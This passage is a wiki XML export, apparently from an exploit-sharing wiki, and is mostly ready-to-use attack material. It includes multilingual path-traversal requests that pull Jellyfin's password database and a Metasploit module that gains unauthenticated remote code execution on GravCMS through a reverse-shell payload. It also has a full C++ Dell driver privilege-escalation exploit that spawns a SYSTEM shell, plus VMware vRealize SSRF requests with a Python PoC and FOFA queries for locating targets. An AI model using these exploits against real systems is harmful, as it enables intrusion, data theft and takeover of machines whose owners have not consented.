&lt;/pre&gt;


==POC5==
&lt;pre&gt;
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
&lt;/pre&gt;</text>
      <sha1>53cj8bpsk24m88ke8il731vuasqj83e</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21402 Jellyfin 任意文件讀取漏洞/es</title>
    <ns>0</ns>
    <id>933</id>
    <revision>
      <id>1203</id>
      <timestamp>2021-04-08T04:07:47Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versión afectada =="</comment>
      <origin>1203</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1254" sha1="dx1hv2ralg5njlkcejlzpwrz5f5qpe3" xml:space="preserve">&lt;languages  /&gt;

== Versión afectada ==

&lt;pre&gt;
jellyfin&lt;=10.7.0
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Jellyfin"
&lt;/pre&gt;


==POC1==
Descarga &lt;code&gt;jellyfin.db&lt;/code&gt; con contraseña del servidor
&lt;pre&gt;
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
&lt;/pre&gt;

==POC3==
&lt;pre&gt;
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
&lt;/pre&gt;

==POC4==
POC para descargar &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;

&lt;pre&gt;
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1
&lt;/pre&gt;


==POC5==
&lt;pre&gt;
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
&lt;/pre&gt;</text>
      <sha1>dx1hv2ralg5njlkcejlzpwrz5f5qpe3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21402 Jellyfin 任意文件讀取漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5102</id>
    <revision>
      <id>5842</id>
      <timestamp>2021-06-24T02:45:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-21402 Jellyfin 任意文件读取漏洞"</comment>
      <origin>5842</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1239" sha1="6yant2tivx38ig8kf9bw1cuapwnjbpv" xml:space="preserve">&lt;languages  /&gt;

==影响版本==

&lt;pre&gt;
jellyfin&lt;=10.7.0
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Jellyfin"
&lt;/pre&gt;


==POC1==
从服务器下载带有密码的&lt;code&gt;jellyfin.db&lt;/code&gt;
&lt;pre&gt;
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
&lt;/pre&gt;

==POC3==
&lt;pre&gt;
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
&lt;/pre&gt;

==POC4==
要下载的POC &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;

&lt;pre&gt;
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1
&lt;/pre&gt;


==POC5==
&lt;pre&gt;
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
&lt;/pre&gt;</text>
      <sha1>6yant2tivx38ig8kf9bw1cuapwnjbpv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21402 Jellyfin 任意文件讀取漏洞/zh-hans</title>
    <ns>0</ns>
    <id>4217</id>
    <revision>
      <id>4850</id>
      <timestamp>2021-06-12T09:26:05Z</timestamp>
      <contributor>
        <username>Atsud0</username>
        <id>41</id>
      </contributor>
      <comment>Created page with "==影响版本=="</comment>
      <origin>4850</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1239" sha1="6yant2tivx38ig8kf9bw1cuapwnjbpv" xml:space="preserve">&lt;languages  /&gt;

==影响版本==

&lt;pre&gt;
jellyfin&lt;=10.7.0
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Jellyfin"
&lt;/pre&gt;


==POC1==
从服务器下载带有密码的&lt;code&gt;jellyfin.db&lt;/code&gt;
&lt;pre&gt;
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
&lt;/pre&gt;

==POC3==
&lt;pre&gt;
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
&lt;/pre&gt;

==POC4==
要下载的POC &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;

&lt;pre&gt;
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1
&lt;/pre&gt;


==POC5==
&lt;pre&gt;
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
&lt;/pre&gt;</text>
      <sha1>6yant2tivx38ig8kf9bw1cuapwnjbpv</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21402 Jellyfin 任意文件讀取漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5106</id>
    <revision>
      <id>5846</id>
      <timestamp>2021-06-24T02:57:27Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "要下載的POC &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;"</comment>
      <origin>5846</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1242" sha1="efprw7st95xk8cdhyosirey7yy3zhhn" xml:space="preserve">&lt;languages  /&gt;

==影響版本==

&lt;pre&gt;
jellyfin&lt;=10.7.0
&lt;/pre&gt;

==FOFA==
&lt;pre&gt;
title="Jellyfin"
&lt;/pre&gt;


==POC1==
從伺服器器下載帶有密碼的&lt;code&gt;jellyfin.db&lt;/code&gt;
&lt;pre&gt;
GET /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ HTTP/1.1
Host: x.x.x.x
accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Referer: http://x.x.x.x/web/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
&lt;/pre&gt;

==POC2==
&lt;pre&gt;
GET /Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db HTTP/1.1
&lt;/pre&gt;

==POC3==
&lt;pre&gt;
GET /Videos/anything/hls/..%5Cdata%5Cjellyfin.db/stream.m3u8/?api_key=4c5750626da14b0a804977b09bf3d8f7 HTTP/1.1
&lt;/pre&gt;

==POC4==
要下載的POC &lt;code&gt;c:tempfilename.jpg&lt;/code&gt;

&lt;pre&gt;
GET /Images/Ratings/c:%5ctemp/filename HTTP/1.1 
GET /Images/Ratings/..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5ctemp/filename HTTP/1.1
&lt;/pre&gt;


==POC5==
&lt;pre&gt;
POST /Videos/d7634eb0064cce760f3f0bf8282c16cd/Subtitles HTTP/1.1
...
X-Emby-Authorization: MediaBrowser DeviceId="...", Version="10.7.0", Token="..."
...

{"language":".\..\","format":".\..\test.bin","isForced":false,"data":"base64 encoded data"}
&lt;/pre&gt;</text>
      <sha1>efprw7st95xk8cdhyosirey7yy3zhhn</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21425 GravCMS 1.10.7 未經身份驗證任意YAML寫入/更新漏洞</title>
    <ns>0</ns>
    <id>1478</id>
    <revision>
      <id>1855</id>
      <timestamp>2021-04-22T02:02:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule..."</comment>
      <origin>1855</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5816" sha1="mguxtm0r244o6c0p64pj72e2mtamka0" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' =&gt; 'GravCMS Remote Command Execution',
        'Description' =&gt; %q{
          This module exploits arbitrary config write/update vulnerability to achieve remote code execution.
          Unauthenticated users can execute a terminal command under the context of the web server user.

          Grav Admin Plugin is an HTML user interface that provides a way to configure Grav and create and modify pages.
          In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without
          needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of
          existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes,
          such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability,
          an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command
          under the context of the web-server user.
        },
        'License' =&gt; MSF_LICENSE,
        'Author' =&gt;
          [
            'Mehmet Ince &lt;mehmet@mehmetince.net&gt;' # author &amp; msf module
          ],
        'References' =&gt;
          [
            ['CVE', '2021-21425'],
            ['URL', 'https://pentest.blog/unexpected-journey-7-gravcms-unauthenticated-arbitrary-yaml-write-update-leads-to-code-execution/']
          ],
        'Privileged' =&gt; true,
        'Platform' =&gt; ['php'],
        'Arch' =&gt; ARCH_PHP,
        'DefaultOptions' =&gt;
          {
            'payload' =&gt; 'php/meterpreter/reverse_tcp',
            'Encoder' =&gt; 'php/base64',
            'WfsDelay' =&gt; 90
          },
        'Targets' =&gt; [ ['Automatic', {}] ],
        'DisclosureDate' =&gt; '2021-03-29',
        'DefaultTarget' =&gt; 0,
        'Notes' =&gt; {
          'Stability' =&gt; [CRASH_SAFE],
          'Reliability' =&gt; [REPEATABLE_SESSION],
          'SideEffects' =&gt; [
            CONFIG_CHANGES # user/config/scheduler.yaml
          ]
        }
      )
    )

  end

  def check
    # During the fix, developers changed admin-nonce to login-nonce.

    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin')
    )

    if res &amp;&amp; !res.get_hidden_inputs.first['admin-nonce'].nil?
      CheckCode::Appears
    else
      CheckCode::Safe
    end
  end

  def capture_cookie_token
    print_status 'Sending request to the admin path to generate cookie and token'
    res = send_request_cgi(
      'method' =&gt; 'GET',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin')
    )

    # Cookie must contain grav-site-az09-admin and admin-nonce form field must contain value
    if res &amp;&amp; res.get_cookies =~ /grav-site-[a-z0-9]+-admin=(\S*);/ &amp;&amp; !res.get_hidden_inputs.first['admin-nonce'].nil?
      print_good 'Cookie and CSRF token successfully extracted !'
    else
      fail_with Failure::UnexpectedReply, 'The server sent a response, but cookie and token was not found.'
    end

    @cookie = res.get_cookies
    @admin_nonce = res.get_hidden_inputs.first['admin-nonce']

  end

  def exploit

    unless check == CheckCode::Appears
      fail_with Failure::NotVulnerable, 'Target is not vulnerable.'
    end

    capture_cookie_token

    @task_name = Rex::Text.rand_text_alpha_lower(5)

    # Msf PHP payload does not contain quotes for many good reasons. But a single quote will surround PHP binary's
    # parameter due to the command execution library of the GravCMS. For that reason, surrounding base64 part of the
    # payload with a double quote is necessary to command executed successfully.

    payload.encoded.sub! 'base64_decode(', 'base64_decode("'
    payload.encoded.sub! '));', '"));'

    print_status 'Implanting payload via scheduler feature'

    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'config', 'scheduler'),
      'cookie' =&gt; @cookie,
      'vars_post' =&gt; {
        'admin-nonce' =&gt; @admin_nonce,
        'task' =&gt; 'SaveDefault',
        "data[custom_jobs][#{@task_name}][command]" =&gt; '/usr/bin/php',
        "data[custom_jobs][#{@task_name}][args]" =&gt; "-r #{payload.encoded}",
        "data[custom_jobs][#{@task_name}][at]" =&gt; '* * * * *',
        "data[custom_jobs][#{@task_name}][output]" =&gt; '',
        "data[status][#{@task_name}]" =&gt; 'enabled',
        "data[custom_jobs][#{@task_name}][output_mode]" =&gt; 'append'
      }
    )

    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.include?('Successfully saved')
      print_good 'Scheduler successfully created ! Wait for 1 minute...'
    end

  end

  def on_new_session
    print_status 'Cleaning up the the scheduler...'

    # Thanks to the YAML update method, we can remove the command details from the config file just by re-enabling
    # the scheduler without any parameter:) It will leave the only command name in the config file.

    res = send_request_cgi(
      'method' =&gt; 'POST',
      'uri' =&gt; normalize_uri(target_uri.path, 'admin', 'config', 'scheduler'),
      'cookie' =&gt; @cookie,
      'vars_post' =&gt; {
        'admin-nonce' =&gt; @admin_nonce,
        'task' =&gt; 'SaveDefault',
        "data[status][#{@task_name}]" =&gt; 'enabled'
      }
    )

    if res &amp;&amp; res.code == 200 &amp;&amp; res.body.include?('Successfully saved')
      print_good 'The scheduler config successfully cleaned up!'
    end

  end

end
            
&lt;/pre&gt;</text>
      <sha1>mguxtm0r244o6c0p64pj72e2mtamka0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21551 DELL dbutil 2 3.sys 2.3 任意寫入&amp;本地特權提升漏洞（LPE）</title>
    <ns>0</ns>
    <id>2521</id>
    <revision>
      <id>3014</id>
      <timestamp>2021-05-21T09:11:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: DELL dbutil_2_3.sys 2.3 - Arbitrary Write to Local Privilege Escalation (LPE) # Date: 10/05/2021 # Exploit Author: Paolo Stagno aka VoidSec # Ve..."</comment>
      <origin>3014</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="6729" sha1="28e9dnr54t00m0zyo2r6vxf97q5r45w" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: DELL dbutil_2_3.sys 2.3 - Arbitrary Write to Local Privilege Escalation (LPE)
# Date: 10/05/2021
# Exploit Author: Paolo Stagno aka VoidSec
# Version: &lt;= 2.3
# CVE: CVE-2021-21551
# Tested on: Windows 10 Pro x64 v.1903 Build 18362.30
# Blog: https://voidsec.com/reverse-engineering-and-exploiting-dell-cve-2021-21551/

#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;winternl.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;algorithm&gt;

#define IOCTL_CODE 0x9B0C1EC8 // IOCTL_CODE value, used to reach the vulnerable function (taken from IDA)
#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 1024 * 1024 * 2

// define the buffer structure which will be sent to the vulnerable driver
typedef struct Exploit
{
	uint64_t    Field1;     // "padding" can be anything
	void*		Field2;		// where to write
	uint64_t    Field3;     // must be 0
	uint64_t    Field4;     // value to write
};

typedef struct outBuffer
{
	uint64_t    Field1;
	uint64_t	Field2;
	uint64_t    Field3;
	uint64_t    Field4;
};

// define a pointer to the native function 'NtQuerySystemInformation'
using pNtQuerySystemInformation = NTSTATUS(WINAPI*)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

// define the SYSTEM_HANDLE_TABLE_ENTRY_INFO structure
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

// define the SYSTEM_HANDLE_INFORMATION structure
typedef struct _SYSTEM_HANDLE_INFORMATION
{
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

int main(int argc, char** argv)
{

	// open a handle to the device exposed by the driver - symlink is \\.\\DBUtil_2_3
	HANDLE device = ::CreateFileW(
		L"\\\\.\\DBUtil_2_3",
		GENERIC_WRITE | GENERIC_READ,
		NULL,
		nullptr,
		OPEN_EXISTING,
		NULL,
		NULL);
	if (device == INVALID_HANDLE_VALUE)
	{
		std::cout &lt;&lt; "[!] Couldn't open handle to DBUtil_2_3 driver. Error code: " &lt;&lt; ::GetLastError() &lt;&lt; std::endl;
		return -1;
	}
	std::cout &lt;&lt; "[+] Opened a handle to DBUtil_2_3 driver!\n";

	// resolve the address of NtQuerySystemInformation and assign it to a function pointer
	pNtQuerySystemInformation NtQuerySystemInformation = (pNtQuerySystemInformation)::GetProcAddress(::LoadLibraryW(L"ntdll"), "NtQuerySystemInformation");
	if (!NtQuerySystemInformation)
	{
		std::cout &lt;&lt; "[!] Couldn't resolve NtQuerySystemInformation API. Error code: " &lt;&lt; ::GetLastError() &lt;&lt; std::endl;
		return -1;
	}
	std::cout &lt;&lt; "[+] Resolved NtQuerySystemInformation!\n";

	// open the current process token - it will be used to retrieve its kernelspace address later
	HANDLE currentProcess = ::GetCurrentProcess();
	HANDLE currentToken = NULL;
	bool success = ::OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &amp;currentToken);
	if (!success)
	{
		std::cout &lt;&lt; "[!] Couldn't open handle to the current process token. Error code: " &lt;&lt; ::GetLastError() &lt;&lt; std::endl;
		return -1;
	}
	std::cout &lt;&lt; "[+] Opened a handle to the current process token!\n";

	// allocate space in the heap for the handle table information which will be filled by the call to 'NtQuerySystemInformation' API
	PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(::GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);

	// call NtQuerySystemInformation and fill the handleTableInformation structure
	ULONG returnLength = 0;
	NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &amp;returnLength);

	uint64_t tokenAddress = 0;
	// iterate over the system's handle table and look for the handles beloging to our process
	for (int i = 0; i &lt; handleTableInformation-&gt;NumberOfHandles; i++)
	{
		SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation-&gt;Handles[i];
		// if it finds our process and the handle matches the current token handle we already opened, print it
		if (handleInfo.UniqueProcessId == ::GetCurrentProcessId() &amp;&amp; handleInfo.HandleValue == (USHORT)currentToken)
		{
			tokenAddress = (uint64_t)handleInfo.Object;
			std::cout &lt;&lt; "[+] Current token address in kernelspace is at: 0x" &lt;&lt; std::hex &lt;&lt; tokenAddress &lt;&lt; std::endl;
		}
	}

	outBuffer buffer =
	{
		0,
		0,
		0,
		0
	};

	/*
	dt nt!_SEP_TOKEN_PRIVILEGES
	   +0x000 Present          : Uint8B
	   +0x008 Enabled          : Uint8B
	   +0x010 EnabledByDefault : Uint8B

	We've added +1 to the offsets to ensure that the low bytes part are 0xff.
	*/

	// overwrite the _SEP_TOKEN_PRIVILEGES  "Present" field in the current process token
	Exploit exploit =
	{
		0x4141414142424242,
		(void*)(tokenAddress + 0x40),
		0x0000000000000000,
		0xffffffffffffffff
	};

	// overwrite the _SEP_TOKEN_PRIVILEGES  "Enabled" field in the current process token
	Exploit exploit2 =
	{
		0x4141414142424242,
		(void*)(tokenAddress + 0x48),
		0x0000000000000000,
		0xffffffffffffffff
	};

	// overwrite the _SEP_TOKEN_PRIVILEGES  "EnabledByDefault" field in the current process token
	Exploit exploit3 =
	{
		0x4141414142424242,
		(void*)(tokenAddress + 0x50),
		0x0000000000000000,
		0xffffffffffffffff
	};

	DWORD bytesReturned = 0;
	success = DeviceIoControl(
		device,
		IOCTL_CODE,
		&amp;exploit,
		sizeof(exploit),
		&amp;buffer,
		sizeof(buffer),
		&amp;bytesReturned,
		nullptr);
	if (!success)
	{
		std::cout &lt;&lt; "[!] Couldn't overwrite current token 'Present' field. Error code: " &lt;&lt; ::GetLastError() &lt;&lt; std::endl;
		return -1;
	}
	std::cout &lt;&lt; "[+] Successfully overwritten current token 'Present' field!\n";

	success = DeviceIoControl(
		device,
		IOCTL_CODE,
		&amp;exploit2,
		sizeof(exploit2),
		&amp;buffer,
		sizeof(buffer),
		&amp;bytesReturned,
		nullptr);
	if (!success)
	{
		std::cout &lt;&lt; "[!] Couldn't overwrite current token 'Enabled' field. Error code: " &lt;&lt; ::GetLastError() &lt;&lt; std::endl;
		return -1;
	}
	std::cout &lt;&lt; "[+] Successfully overwritten current token 'Enabled' field!\n";

	success = DeviceIoControl(
		device,
		IOCTL_CODE,
		&amp;exploit3,
		sizeof(exploit3),
		&amp;buffer,
		sizeof(buffer),
		&amp;bytesReturned,
		nullptr);
	if (!success)
	{
		std::cout &lt;&lt; "[!] Couldn't overwrite current token 'EnabledByDefault' field. Error code:" &lt;&lt; ::GetLastError() &lt;&lt; std::endl;
		return -1;
	}
	std::cout &lt;&lt; "[+] Successfully overwritten current token 'EnabledByDefault' field!\n";
	std::cout &lt;&lt; "[+] Token privileges successfully overwritten!\n";
	std::cout &lt;&lt; "[+] Spawning a new shell with full privileges!\n";

	system("cmd.exe");

	return 0;
}
&lt;/pre&gt;</text>
      <sha1>28e9dnr54t00m0zyo2r6vxf97q5r45w</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-21975 VMware vRealize Operations Manager SSRF漏洞</title>
    <ns>0</ns>
    <id>599</id>
    <revision>
      <id>813</id>
      <timestamp>2021-03-31T12:22:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages  /&gt;  &lt;translate&gt; ==漏洞影響== &lt;/translate&gt;  &lt;pre&gt; vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0  cloud_foundation: 4.x 3.x  vReal..."</comment>
      <origin>813</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3405" sha1="rgqimnhv4q80tjgnufo5eya1bf122x6" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用==
&lt;/translate&gt;

&lt;translate&gt;
發送如下請求包:
&lt;/translate&gt;
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["eheeyd.dnslog.cn"]
&lt;/pre&gt;



&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 24


["127.0.0.1:443/ui"]
&lt;/pre&gt;


==POC==
&lt;pre&gt;
import requests
import sys
import random
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: VMware vRealize Operations Manager                         \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+  \033[36mDnslog      &gt;&gt;&gt; xxx.dnslog.com                                     \033[0m')
    print('+------------------------------------------')

def POC_1(target_url, v):
    vuln_url = target_url + "/casa/nodes/thumbprints"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8"
    }
    data = '["{}"]'.format(Dnslog)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200 :
            print("\033[32m[o] 目标 {} 可能存在SSRF漏洞,请检查 Dnslog 响应 \033[0m".format(target_url, vuln_url))
        else:
            print("\033[31m[x] 目标 {} 不存在漏洞 \033[0m".format(target_url))
    except Exception as e:
        print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl    &gt;&gt;&gt; \033[0m"))
    Dnslog = str(input("\033[35mDnslog &gt;&gt;&gt; \033[0m"))
    POC_1(target_url, Dnslog)
&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;

https://mp.weixin.qq.com/s/fAYvOdmZO-daxe5FUI8wQA</text>
      <sha1>rgqimnhv4q80tjgnufo5eya1bf122x6</sha1>
    </revision>
    <revision>
      <id>814</id>
      <parentid>813</parentid>
      <timestamp>2021-03-31T12:22:50Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>814</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3449" sha1="ruuag5spze42u9bwrd8oqyuh7h4ralv" xml:space="preserve">&lt;languages  /&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;pre&gt;
vRealize_operations_manager: 8.0.0, 8.0.1, 8.3.0, 8.1.0, 8.1.1, 8.2.0, 7.5.0

cloud_foundation: 4.x 3.x

vRealize_suite_lifecycle_manager: 8.x
&lt;/pre&gt;


==FOFA==
&lt;pre&gt;
title="vRealize Operations Manager"
&lt;/pre&gt;


&lt;translate&gt;
==漏洞利用== &lt;!--T:2--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:3--&gt;
發送如下請求包:
&lt;/translate&gt;
&lt;pre&gt;
POST /casa/nodes/thumbprints HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
